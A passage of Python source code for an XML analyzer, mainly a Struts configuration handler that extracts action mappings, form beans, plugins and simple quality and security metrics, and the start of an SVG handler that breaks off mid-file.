    def _assess_spring_config_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        # Assess configuration quality
        beans = findings['beans']
        
        # Check for good practices
        uses_profiles = len(findings['profiles']) > 0
        externalizes_config = len(findings['property_sources']) > 0
        reasonable_bean_count = beans['count'] < 100  # Large XML configs are hard to maintain
        
        return {
            "maintainability": 0.8 if reasonable_bean_count else 0.3,
            "flexibility": 1.0 if uses_profiles else 0.5,
            "configuration_management": 1.0 if externalizes_config else 0.4
        }
</file>

<file path="src/handlers/struts_config_handler.py">
#!/usr/bin/env python3
"""
Struts Configuration Handler

Analyzes Apache Struts framework configuration files (struts-config.xml).
Extracts action mappings, form beans, controller configuration, data sources,
message resources, and plugin definitions for enterprise Java web applications.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class StrutsConfigHandler(XMLHandler):
    """Handler for Apache Struts configuration files"""
    
    STRUTS_NAMESPACE = "http://struts.apache.org/dtds/struts-config"
    STRUTS_DTD_PATTERNS = [
        "struts-config",
        "apache.org/dtds/struts-config",
        "jakarta.apache.org/struts/dtds"
    ]
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for Struts namespace or DTD references
        for uri in namespaces.values():
            if any(pattern in uri.lower() for pattern in self.STRUTS_DTD_PATTERNS):
                return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'struts-config':
            return True, 0.95
        
        # Check for Struts-specific elements
        struts_elements = ['action-mappings', 'form-beans', 'global-forwards', 'controller']
        found_elements = sum(1 for elem in struts_elements 
                           if root.find(f'.//{elem}') is not None)
        
        if found_elements >= 2:
            return True, min(found_elements * 0.25, 0.9)
        
        # Check for action elements with Struts attributes
        actions = root.findall('.//action')
        if actions:
            struts_attrs = ['path', 'type', 'forward', 'include']
            action_score = 0
            for action in actions[:5]:  # Check first 5 actions
                attrs = list(action.attrib.keys())
                if any(attr in struts_attrs for attr in attrs):
                    action_score += 0.2
            
            if action_score >= 0.4:
                return True, min(action_score + 0.3, 0.8)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect Struts version
        version = "1.x"  # Default
        
        # Check DTD version
        for uri in namespaces.values():
            if "struts-config_1_0" in uri:
                version = "1.0"
            elif "struts-config_1_1" in uri:
                version = "1.1"
            elif "struts-config_1_2" in uri:
                version = "1.2"  
            elif "struts-config_1_3" in uri:
                version = "1.3"
            elif "struts-config_1_4" in uri:
                version = "1.4"
        
        # Detect configuration type
        config_type = "standard"
        
        # Check for modular configuration
        if root.find('message-resources') is not None:
            config_type = "internationalized"
        
        # Check for tiles integration
        if any(plugin.get('className', '').find('tiles') != -1 
               for plugin in root.findall('.//plug-in')):
            config_type = "tiles_integrated"
        
        # Check for validator integration
        if any(plugin.get('className', '').find('validator') != -1 
               for plugin in root.findall('.//plug-in')):
            config_type = "validator_integrated"
        
        # Count actions to determine complexity
        action_count = len(root.findall('.//action'))
        complexity = "simple" if action_count < 10 else "medium" if action_count < 50 else "complex"
        
        return DocumentTypeInfo(
            type_name="Struts Configuration",
            confidence=0.95,
            version=version,
            metadata={
                "framework": "Apache Struts",
                "category": "web_framework_config",
                "config_type": config_type,
                "complexity": complexity,
                "action_count": action_count
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'configuration_info': self._analyze_configuration(root),
            'action_mappings': self._analyze_action_mappings(root),
            'form_beans': self._analyze_form_beans(root),
            'global_forwards': self._analyze_global_forwards(root),
            'controller_config': self._analyze_controller(root),
            'data_sources': self._analyze_data_sources(root),
            'message_resources': self._analyze_message_resources(root),
            'exception_config': self._analyze_exception_config(root),
            'plugins': self._analyze_plugins(root),
            'security_analysis': self._analyze_security_patterns(root),
            'architecture_metrics': self._calculate_architecture_metrics(root)
        }
        
        recommendations = [
            "Migrate to modern Spring MVC or Spring Boot framework",
            "Implement RESTful API design patterns",
            "Add comprehensive input validation and sanitization",
            "Implement proper error handling and logging",
            "Configure security filters and authentication",
            "Optimize action mapping patterns for better performance",
            "Implement internationalization best practices",
            "Add monitoring and health check endpoints",
            "Document API endpoints and business logic",
            "Implement automated testing for actions and forms"
        ]
        
        ai_use_cases = [
            "Legacy application modernization planning",
            "Automated migration to Spring Framework",
            "Security vulnerability assessment",
            "Performance optimization recommendations",
            "Code complexity analysis and refactoring",
            "Architecture pattern recognition",
            "Dependency mapping and analysis",
            "Configuration validation and best practices",
            "Documentation generation from configuration",
            "Testing strategy development for legacy code"
        ]
        
        return SpecializedAnalysis(
            document_type="Struts Configuration",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_actions': findings['action_mappings']['action_count'],
                'form_beans': findings['form_beans']['bean_count'],
                'global_forwards': findings['global_forwards']['forward_count'],
                'data_sources': findings['data_sources']['source_count'],
                'plugins': findings['plugins']['plugin_count'],
                'message_resources': findings['message_resources']['resource_count']
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_configuration_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'application_structure': self._extract_application_structure(root),
            'action_catalog': self._extract_action_catalog(root),
            'form_definitions': self._extract_form_definitions(root),
            'navigation_flow': self._extract_navigation_flow(root),
            'resource_configuration': self._extract_resource_config(root)
        }
    
    def _analyze_configuration(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze overall configuration structure"""
        config_info = {
            'root_element': root.tag,
            'has_dtd': False,
            'dtd_version': None,
            'namespaces': {},
            'main_sections': []
        }
        
        # Check for DTD
        if hasattr(root, 'getroottree'):
            tree = root.getroottree()
            if hasattr(tree, 'docinfo') and tree.docinfo.public_id:
                config_info['has_dtd'] = True
                config_info['dtd_version'] = tree.docinfo.public_id
        
        # Extract namespaces
        if '}' in root.tag:
            namespace = root.tag.split('}')[0] + '}'
            config_info['namespaces']['default'] = namespace.strip('{}')
        
        # Identify main configuration sections
        main_sections = [
            'data-sources', 'form-beans', 'global-exceptions', 'global-forwards',
            'action-mappings', 'controller', 'message-resources', 'plug-ins'
        ]
        
        for section in main_sections:
            if root.find(section) is not None:
                config_info['main_sections'].append(section)
        
        return config_info
    
    def _analyze_action_mappings(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze action mappings"""
        action_info = {
            'action_count': 0,
            'actions': [],
            'path_patterns': [],
            'action_types': {},
            'forward_patterns': {},
            'scope_usage': {}
        }
        
        actions = root.findall('.//action')
        action_info['action_count'] = len(actions)
        
        for action in actions:
            action_data = {
                'path': action.get('path'),
                'type': action.get('type'),
                'name': action.get('name'),
                'scope': action.get('scope', 'request'),
                'validate': action.get('validate', 'true').lower() == 'true',
                'input': action.get('input'),
                'parameter': action.get('parameter'),
                'attribute': action.get('attribute'),
                'forwards': [],
                'exceptions': []
            }
            
            # Track patterns
            if action_data['path']:
                action_info['path_patterns'].append(action_data['path'])
            
            # Track action types
            if action_data['type']:
                action_info['action_types'][action_data['type']] = \
                    action_info['action_types'].get(action_data['type'], 0) + 1
            
            # Track scope usage
            scope = action_data['scope']
            action_info['scope_usage'][scope] = \
                action_info['scope_usage'].get(scope, 0) + 1
            
            # Extract forwards
            for forward in action.findall('forward'):
                forward_data = {
                    'name': forward.get('name'),
                    'path': forward.get('path'),
                    'redirect': forward.get('redirect', 'false').lower() == 'true',
                    'contextRelative': forward.get('contextRelative', 'false').lower() == 'true'
                }
                action_data['forwards'].append(forward_data)
                
                # Track forward patterns
                if forward_data['name']:
                    action_info['forward_patterns'][forward_data['name']] = \
                        action_info['forward_patterns'].get(forward_data['name'], 0) + 1
            
            # Extract exceptions
            for exception in action.findall('exception'):
                exception_data = {
                    'key': exception.get('key'),
                    'type': exception.get('type'),
                    'path': exception.get('path'),
                    'scope': exception.get('scope')
                }
                action_data['exceptions'].append(exception_data)
            
            action_info['actions'].append(action_data)
        
        return action_info
    
    def _analyze_form_beans(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze form bean definitions"""
        form_info = {
            'bean_count': 0,
            'beans': [],
            'form_types': {},
            'dynamic_forms': 0,
            'validation_enabled': 0
        }
        
        form_beans = root.findall('.//form-bean')
        form_info['bean_count'] = len(form_beans)
        
        for bean in form_beans:
            bean_data = {
                'name': bean.get('name'),
                'type': bean.get('type'),
                'dynamic': bean.get('dynamic', 'false').lower() == 'true',
                'properties': []
            }
            
            # Track form types
            if bean_data['type']:
                form_info['form_types'][bean_data['type']] = \
                    form_info['form_types'].get(bean_data['type'], 0) + 1
            
            # Count dynamic forms
            if bean_data['dynamic']:
                form_info['dynamic_forms'] += 1
            
            # Extract form properties (for dynamic forms)
            for prop in bean.findall('form-property'):
                prop_data = {
                    'name': prop.get('name'),
                    'type': prop.get('type'),
                    'initial': prop.get('initial'),
                    'size': prop.get('size')
                }
                bean_data['properties'].append(prop_data)
            
            form_info['beans'].append(bean_data)
        
        return form_info
    
    def _analyze_global_forwards(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze global forward definitions"""
        forward_info = {
            'forward_count': 0,
            'forwards': [],
            'redirect_count': 0,
            'context_relative_count': 0
        }
        
        forwards = root.findall('.//global-forwards/forward')
        forward_info['forward_count'] = len(forwards)
        
        for forward in forwards:
            forward_data = {
                'name': forward.get('name'),
                'path': forward.get('path'),
                'redirect': forward.get('redirect', 'false').lower() == 'true',
                'contextRelative': forward.get('contextRelative', 'false').lower() == 'true'
            }
            
            if forward_data['redirect']:
                forward_info['redirect_count'] += 1
            
            if forward_data['contextRelative']:
                forward_info['context_relative_count'] += 1
            
            forward_info['forwards'].append(forward_data)
        
        return forward_info
    
    def _analyze_controller(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze controller configuration"""
        controller_info = {
            'has_controller': False,
            'buffer_size': None,
            'content_type': None,
            'debug': None,
            'input_forward': None,
            'locale': None,
            'max_file_size': None,
            'multipart_class': None,
            'no_cache': None,
            'process_class': None,
            'temp_dir': None
        }
        
        controller = root.find('controller')
        if controller is not None:
            controller_info['has_controller'] = True
            
            # Extract controller attributes
            attrs = [
                'bufferSize', 'contentType', 'debug', 'inputForward',
                'locale', 'maxFileSize', 'multipartClass', 'nocache',
                'processorClass', 'tempDir'
            ]
            
            for attr in attrs:
                value = controller.get(attr)
                if value:
                    key = attr.lower().replace('class', '_class')
                    controller_info[key] = value
        
        return controller_info
    
    def _analyze_data_sources(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze data source configurations"""
        ds_info = {
            'source_count': 0,
            'sources': [],
            'driver_types': {},
            'connection_pools': 0
        }
        
        data_sources = root.findall('.//data-source')
        ds_info['source_count'] = len(data_sources)
        
        for ds in data_sources:
            ds_data = {
                'key': ds.get('key'),
                'type': ds.get('type'),
                'properties': {}
            }
            
            # Extract set-property elements
            for prop in ds.findall('set-property'):
                prop_name = prop.get('property')
                prop_value = prop.get('value')
                if prop_name:
                    ds_data['properties'][prop_name] = prop_value
                    
                    # Track driver types
                    if prop_name == 'driverClassName' and prop_value:
                        ds_info['driver_types'][prop_value] = \
                            ds_info['driver_types'].get(prop_value, 0) + 1
                    
                    # Count connection pools
                    if 'pool' in prop_name.lower():
                        ds_info['connection_pools'] += 1
            
            ds_info['sources'].append(ds_data)
        
        return ds_info
    
    def _analyze_message_resources(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze message resource configurations"""
        msg_info = {
            'resource_count': 0,
            'resources': [],
            'internationalization': False,
            'null_handling': {},
            'factory_types': {}
        }
        
        resources = root.findall('.//message-resources')
        msg_info['resource_count'] = len(resources)
        
        for resource in resources:
            resource_data = {
                'parameter': resource.get('parameter'),
                'key': resource.get('key'),
                'factory': resource.get('factory'),
                'null': resource.get('null'),
                'escape': resource.get('escape')
            }
            
            # Check for internationalization
            if resource_data['parameter'] and ('_' in resource_data['parameter'] or 
                                               'messages' in resource_data['parameter'].lower()):
                msg_info['internationalization'] = True
            
            # Track null handling
            if resource_data['null']:
                msg_info['null_handling'][resource_data['null']] = \
                    msg_info['null_handling'].get(resource_data['null'], 0) + 1
            
            # Track factory types
            if resource_data['factory']:
                msg_info['factory_types'][resource_data['factory']] = \
                    msg_info['factory_types'].get(resource_data['factory'], 0) + 1
            
            msg_info['resources'].append(resource_data)
        
        return msg_info
    
    def _analyze_exception_config(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze exception handling configuration"""
        exc_info = {
            'global_exceptions': 0,
            'action_exceptions': 0,
            'exception_types': {},
            'error_pages': []
        }
        
        # Global exceptions
        global_exceptions = root.findall('.//global-exceptions/exception')
        exc_info['global_exceptions'] = len(global_exceptions)
        
        # Action-level exceptions
        action_exceptions = root.findall('.//action-mappings/action/exception')
        exc_info['action_exceptions'] = len(action_exceptions)
        
        # Analyze all exceptions
        all_exceptions = global_exceptions + action_exceptions
        for exception in all_exceptions:
            exc_type = exception.get('type')
            if exc_type:
                exc_info['exception_types'][exc_type] = \
                    exc_info['exception_types'].get(exc_type, 0) + 1
            
            path = exception.get('path')
            if path:
                exc_info['error_pages'].append({
                    'type': exc_type,
                    'path': path,
                    'key': exception.get('key'),
                    'scope': exception.get('scope')
                })
        
        return exc_info
    
    def _analyze_plugins(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze plugin configurations"""
        plugin_info = {
            'plugin_count': 0,
            'plugins': [],
            'plugin_types': {},
            'tiles_integration': False,
            'validator_integration': False
        }
        
        plugins = root.findall('.//plug-in')
        plugin_info['plugin_count'] = len(plugins)
        
        for plugin in plugins:
            plugin_data = {
                'className': plugin.get('className'),
                'properties': {}
            }
            
            # Extract plugin properties
            for prop in plugin.findall('set-property'):
                prop_name = prop.get('property')
                prop_value = prop.get('value')
                if prop_name:
                    plugin_data['properties'][prop_name] = prop_value
            
            # Track plugin types
            class_name = plugin_data['className']
            if class_name:
                plugin_info['plugin_types'][class_name] = \
                    plugin_info['plugin_types'].get(class_name, 0) + 1
                
                # Check for specific integrations
                if 'tiles' in class_name.lower():
                    plugin_info['tiles_integration'] = True
                elif 'validator' in class_name.lower():
                    plugin_info['validator_integration'] = True
            
            plugin_info['plugins'].append(plugin_data)
        
        return plugin_info
    
    def _analyze_security_patterns(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security-related patterns"""
        security_info = {
            'validation_enabled': 0,
            'secure_forwards': 0,
            'input_validation': 0,
            'xss_protection': False,
            'csrf_protection': False,
            'security_roles': [],
            'potential_vulnerabilities': []
        }
        
        # Check validation on actions
        actions = root.findall('.//action')
        for action in actions:
            if action.get('validate', 'true').lower() == 'true':
                security_info['validation_enabled'] += 1
            
            # Check for input attribute (potential XSS risk)
            if action.get('input'):
                security_info['input_validation'] += 1
        
        # Check for secure forwards (HTTPS)
        forwards = root.findall('.//forward')
        for forward in forwards:
            path = forward.get('path', '')
            if path.startswith('https://'):
                security_info['secure_forwards'] += 1
        
        # Check for security-related plugins
        plugins = root.findall('.//plug-in')
        for plugin in plugins:
            class_name = plugin.get('className', '').lower()
            if 'security' in class_name or 'auth' in class_name:
                security_info['xss_protection'] = True
            elif 'csrf' in class_name or 'token' in class_name:
                security_info['csrf_protection'] = True
        
        # Identify potential vulnerabilities
        if security_info['validation_enabled'] == 0:
            security_info['potential_vulnerabilities'].append('No input validation configured')
        
        if not security_info['xss_protection']:
            security_info['potential_vulnerabilities'].append('No XSS protection detected')
        
        if not security_info['csrf_protection']:
            security_info['potential_vulnerabilities'].append('No CSRF protection detected')
        
        return security_info
    
    def _calculate_architecture_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate architecture and complexity metrics"""
        metrics = {
            'complexity_score': 0.0,
            'coupling_score': 0.0,
            'maintainability_score': 0.0,
            'testability_score': 0.0,
            'action_to_form_ratio': 0.0,
            'forward_reuse_factor': 0.0
        }
        
        # Get component counts
        action_count = len(root.findall('.//action'))
        form_count = len(root.findall('.//form-bean'))
        forward_count = len(root.findall('.//forward'))
        
        # Calculate complexity score
        complexity_factors = [
            min(action_count / 50.0, 1.0) * 0.4,  # Action complexity
            min(form_count / 30.0, 1.0) * 0.3,    # Form complexity
            min(forward_count / 40.0, 1.0) * 0.3   # Navigation complexity
        ]
        metrics['complexity_score'] = sum(complexity_factors)
        
        # Calculate coupling score (based on shared forwards and forms)
        if action_count > 0:
            # Count actions that share forms
            form_usage = {}
            for action in root.findall('.//action'):
                form_name = action.get('name')
                if form_name:
                    form_usage[form_name] = form_usage.get(form_name, 0) + 1
            
            shared_forms = sum(1 for count in form_usage.values() if count > 1)
            metrics['coupling_score'] = min(shared_forms / max(form_count, 1), 1.0)
        
        # Action to form ratio
        if form_count > 0:
            metrics['action_to_form_ratio'] = action_count / form_count
        
        # Forward reuse factor
        if forward_count > 0:
            forward_names = [f.get('name') for f in root.findall('.//forward') if f.get('name')]
            unique_forwards = len(set(forward_names))
            if unique_forwards > 0:
                metrics['forward_reuse_factor'] = forward_count / unique_forwards
        
        # Maintainability score (inverse of complexity)
        metrics['maintainability_score'] = max(0.0, 1.0 - metrics['complexity_score'])
        
        # Testability score (based on validation and structure)
        validation_ratio = 0
        if action_count > 0:
            validated_actions = sum(1 for action in root.findall('.//action') 
                                  if action.get('validate', 'true').lower() == 'true')
            validation_ratio = validated_actions / action_count
        
        metrics['testability_score'] = validation_ratio * 0.6 + metrics['maintainability_score'] * 0.4
        
        return metrics
    
    def _extract_application_structure(self, root: ET.Element) -> Dict[str, Any]:
        """Extract high-level application structure"""
        structure = {
            'configuration_sections': [],
            'component_counts': {},
            'integration_points': []
        }
        
        # Main sections
        sections = ['data-sources', 'form-beans', 'global-forwards', 'action-mappings', 
                   'controller', 'message-resources', 'plug-ins']
        
        for section in sections:
            if root.find(section) is not None:
                structure['configuration_sections'].append(section)
        
        # Component counts
        structure['component_counts'] = {
            'actions': len(root.findall('.//action')),
            'forms': len(root.findall('.//form-bean')),
            'forwards': len(root.findall('.//forward')),
            'data_sources': len(root.findall('.//data-source')),
            'plugins': len(root.findall('.//plug-in'))
        }
        
        # Integration points
        plugins = root.findall('.//plug-in')
        for plugin in plugins:
            class_name = plugin.get('className', '')
            if class_name:
                structure['integration_points'].append(class_name)
        
        return structure
    
    def _extract_action_catalog(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract comprehensive action catalog"""
        actions = []
        
        for action in root.findall('.//action')[:100]:  # Limit for performance
            action_data = {
                'path': action.get('path'),
                'type': action.get('type'),
                'name': action.get('name'),
                'input': action.get('input'),
                'forwards': [f.get('name') for f in action.findall('forward') if f.get('name')],
                'exceptions': [e.get('type') for e in action.findall('exception') if e.get('type')],
                'validation': action.get('validate', 'true').lower() == 'true'
            }
            actions.append(action_data)
        
        return actions
    
    def _extract_form_definitions(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract form bean definitions"""
        forms = []
        
        for form in root.findall('.//form-bean'):
            form_data = {
                'name': form.get('name'),
                'type': form.get('type'),
                'dynamic': form.get('dynamic', 'false').lower() == 'true',
                'properties': []
            }
            
            # Extract properties for dynamic forms
            for prop in form.findall('form-property'):
                prop_data = {
                    'name': prop.get('name'),
                    'type': prop.get('type'),
                    'initial': prop.get('initial')
                }
                form_data['properties'].append(prop_data)
            
            forms.append(form_data)
        
        return forms
    
    def _extract_navigation_flow(self, root: ET.Element) -> Dict[str, Any]:
        """Extract navigation flow information"""
        flow = {
            'global_forwards': [],
            'action_flows': [],
            'entry_points': [],
            'error_pages': []
        }
        
        # Global forwards
        for forward in root.findall('.//global-forwards/forward'):
            flow['global_forwards'].append({
                'name': forward.get('name'),
                'path': forward.get('path'),
                'redirect': forward.get('redirect', 'false').lower() == 'true'
            })
        
        # Action flows
        for action in root.findall('.//action'):
            forwards = [f.get('name') for f in action.findall('forward') if f.get('name')]
            if forwards:
                flow['action_flows'].append({
                    'path': action.get('path'),
                    'forwards': forwards
                })
        
        # Entry points (actions without input)
        for action in root.findall('.//action'):
            if not action.get('input') and action.get('path'):
                flow['entry_points'].append(action.get('path'))
        
        return flow
    
    def _extract_resource_config(self, root: ET.Element) -> Dict[str, Any]:
        """Extract resource configuration"""
        resources = {
            'data_sources': [],
            'message_resources': [],
            'plugins': []
        }
        
        # Data sources
        for ds in root.findall('.//data-source'):
            ds_data = {
                'key': ds.get('key'),
                'type': ds.get('type'),
                'properties': {prop.get('property'): prop.get('value') 
                             for prop in ds.findall('set-property') 
                             if prop.get('property')}
            }
            resources['data_sources'].append(ds_data)
        
        # Message resources
        for msg in root.findall('.//message-resources'):
            resources['message_resources'].append({
                'parameter': msg.get('parameter'),
                'key': msg.get('key'),
                'factory': msg.get('factory')
            })
        
        # Plugins
        for plugin in root.findall('.//plug-in'):
            resources['plugins'].append({
                'className': plugin.get('className'),
                'properties': {prop.get('property'): prop.get('value') 
                             for prop in plugin.findall('set-property') 
                             if prop.get('property')}
            })
        
        return resources
    
    def _assess_configuration_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess configuration quality metrics"""
        metrics = {
            'design_quality': 0.0,
            'security_quality': 0.0,
            'maintainability': 0.0,
            'completeness': 0.0,
            'overall': 0.0
        }
        
        # Design quality
        arch_metrics = findings['architecture_metrics']
        metrics['design_quality'] = arch_metrics['maintainability_score']
        
        # Security quality
        security = findings['security_analysis']
        total_actions = findings['action_mappings']['action_count']
        
        security_score = 0.0
        if total_actions > 0:
            validation_score = security['validation_enabled'] / total_actions
            security_score += validation_score * 0.4
        
        if security['xss_protection']:
            security_score += 0.3
        if security['csrf_protection']:
            security_score += 0.3
        
        metrics['security_quality'] = min(security_score, 1.0)
        
        # Maintainability
        metrics['maintainability'] = arch_metrics['maintainability_score']
        
        # Completeness
        completeness_factors = []
        if findings['action_mappings']['action_count'] > 0:
            completeness_factors.append(0.3)
        if findings['form_beans']['bean_count'] > 0:
            completeness_factors.append(0.2)
        if findings['controller_config']['has_controller']:
            completeness_factors.append(0.2)
        if findings['message_resources']['resource_count'] > 0:
            completeness_factors.append(0.15)
        if findings['exception_config']['global_exceptions'] > 0:
            completeness_factors.append(0.15)
        
        metrics['completeness'] = sum(completeness_factors)
        
        # Overall quality
        metrics['overall'] = (
            metrics['design_quality'] * 0.3 +
            metrics['security_quality'] * 0.25 +
            metrics['maintainability'] * 0.25 +
            metrics['completeness'] * 0.2
        )
        
        return metrics
</file>

<file path="src/handlers/svg_handler.py">
#!/usr/bin/env python3
"""
SVG Handler

Analyzes SVG (Scalable Vector Graphics) documents for design pattern recognition,
accessibility analysis, style extraction, and vector graphic optimization.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class SVGHandler(XMLHandler):
    """Handler for SVG (Scalable Vector Graphics) documents"""
    
    SVG_NAMESPACE = "http://www.w3.org/2000/svg"
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for SVG root element
        if root.tag == f'{{{self.SVG_NAMESPACE}}}svg' or root.tag == 'svg':
            return True, 1.0
        
        # Check for SVG namespace in declared namespaces
        for uri in namespaces.values():
            if self.SVG_NAMESPACE in uri:
                return True, 0.9
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Determine SVG version
        version = root.get('version', '1.1')
        
        # Detect SVG type/purpose
        svg_type = self._detect_svg_type(root)
        
        metadata = {
            "standard": "W3C SVG",
            "category": "graphics",
            "svg_type": svg_type,
            "has_animations": self._check_animations(root),
            "has_scripts": self._has_scripts(root),
            "element_count": len(list(root.iter())),
            "has_accessibility": self._check_accessibility(root)
        }
        
        return DocumentTypeInfo(
            type_name="SVG Graphics",
            confidence=1.0,
            version=version,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'svg_info': {
                'version': root.get('version', '1.1'),
                'svg_type': self._detect_svg_type(root),
                'namespace': self._extract_namespace_info(root)
            },
            'dimensions': self._analyze_dimensions(root),
            'elements': self._analyze_elements(root),
            'graphics': self._analyze_graphics_content(root),
            'styles': self._analyze_styles(root),
            'accessibility': self._analyze_accessibility(root),
            'animations': self._analyze_animations(root),
            'scripts': self._analyze_scripts(root),
            'optimization': self._analyze_optimization_opportunities(root),
            'security': self._analyze_security_aspects(root)
        }
        
        recommendations = [
            "Extract for design system documentation",
            "Analyze for accessibility improvements (title, desc, ARIA labels)",
            "Optimize path data and remove unnecessary elements",
            "Convert to other formats for broader compatibility",
            "Review script usage for security implications",
            "Implement responsive design with viewBox",
            "Add semantic structure with groups and labels",
            "Optimize colors and gradients for performance"
        ]
        
        ai_use_cases = [
            "Automatic icon and graphic classification",
            "Design pattern recognition and extraction",
            "Accessibility compliance analysis and enhancement",
            "Style guide generation for design systems",
            "Vector graphic optimization and compression",
            "Automated color palette extraction",
            "Logo and brand asset management",
            "SVG animation analysis and optimization",
            "Cross-platform compatibility assessment"
        ]
        
        data_inventory = {
            'total_elements': len(findings['elements']['element_details']),
            'graphic_elements': len(findings['graphics']['graphic_elements']),
            'text_elements': len(findings['graphics']['text_elements']),
            'style_definitions': len(findings['styles']['style_definitions']),
            'animations': len(findings['animations']['animation_elements'])
        }
        
        return SpecializedAnalysis(
            document_type=f"SVG {findings['svg_info']['svg_type']}",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_svg_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'svg_metadata': {
                'version': root.get('version', '1.1'),
                'type': self._detect_svg_type(root),
                'dimensions': self._extract_dimension_summary(root)
            },
            'design_summary': self._extract_design_summary(root),
            'accessibility_summary': self._extract_accessibility_summary(root),
            'technical_summary': self._extract_technical_summary(root)
        }
    
    def _detect_svg_type(self, root: ET.Element) -> str:
        """Detect the type/purpose of the SVG"""
        # Count different types of elements to infer purpose
        element_counts = self._count_svg_elements(root)
        
        # Check for common icon patterns
        if element_counts.get('path', 0) > 0 and len(list(root.iter())) < 20:
            return "Icon"
        
        # Check for logo patterns
        if (element_counts.get('text', 0) > 0 and 
            (element_counts.get('path', 0) > 0 or element_counts.get('g', 0) > 0)):
            return "Logo"
        
        # Check for illustration patterns
        if element_counts.get('g', 0) > 3 and len(list(root.iter())) > 50:
            return "Illustration"
        
        # Check for chart/diagram patterns
        if (element_counts.get('line', 0) > 0 or element_counts.get('rect', 0) > 5):
            return "Chart/Diagram"
        
        # Check for animation
        if self._check_animations(root):
            return "Animation"
        
        return "Graphic"
    
    def _extract_namespace_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract namespace information"""
        namespaces = {}
        for key, value in root.attrib.items():
            if key.startswith('xmlns'):
                prefix = key.split(':', 1)[1] if ':' in key else 'default'
                namespaces[prefix] = value
        
        return {
            'declared_namespaces': namespaces,
            'svg_namespace': self.SVG_NAMESPACE in str(namespaces.values()),
            'xlink_namespace': 'xlink' in namespaces
        }
    
    def _analyze_dimensions(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SVG dimensions and viewport"""
        return {
            'width': root.get('width'),
            'height': root.get('height'),
            'viewBox': root.get('viewBox'),
            'preserveAspectRatio': root.get('preserveAspectRatio'),
            'has_responsive_design': root.get('viewBox') is not None,
            'has_fixed_dimensions': root.get('width') is not None and root.get('height') is not None,
            'viewport_info': self._parse_viewport(root)
        }
    
    def _analyze_elements(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SVG elements structure"""
        element_info = {
            'total_elements': 0,
            'element_details': [],
            'element_counts': {},
            'max_depth': 0,
            'group_structure': []
        }
        
        # Count all elements
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            element_info['element_counts'][tag] = element_info['element_counts'].get(tag, 0) + 1
            element_info['total_elements'] += 1
            
            # Analyze individual elements
            element_detail = {
                'tag': tag,
                'id': elem.get('id'),
                'class': elem.get('class'),
                'has_style': elem.get('style') is not None,
                'has_transform': elem.get('transform') is not None
            }
            element_info['element_details'].append(element_detail)
        
        # Calculate structure metrics
        element_info['max_depth'] = self._calculate_max_depth(root)
        element_info['group_structure'] = self._analyze_group_structure(root)
        
        return element_info
    
    def _analyze_graphics_content(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze graphics content types"""
        graphics_info = {
            'graphic_elements': [],
            'text_elements': [],
            'shapes': [],
            'paths': [],
            'images': [],
            'use_elements': []
        }
        
        graphic_tags = ['rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon', 'path']
        
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if tag in graphic_tags:
                graphics_info['graphic_elements'].append({
                    'type': tag,
                    'id': elem.get('id'),
                    'style': elem.get('style'),
                    'fill': elem.get('fill'),
                    'stroke': elem.get('stroke')
                })
                
                if tag == 'path':
                    graphics_info['paths'].append({
                        'id': elem.get('id'),
                        'data': elem.get('d'),
                        'length': len(elem.get('d', ''))
                    })
                else:
                    graphics_info['shapes'].append({
                        'type': tag,
                        'id': elem.get('id')
                    })
            
            elif tag == 'text':
                graphics_info['text_elements'].append({
                    'content': elem.text,
                    'x': elem.get('x'),
                    'y': elem.get('y'),
                    'font_family': elem.get('font-family'),
                    'font_size': elem.get('font-size')
                })
            
            elif tag == 'image':
                graphics_info['images'].append({
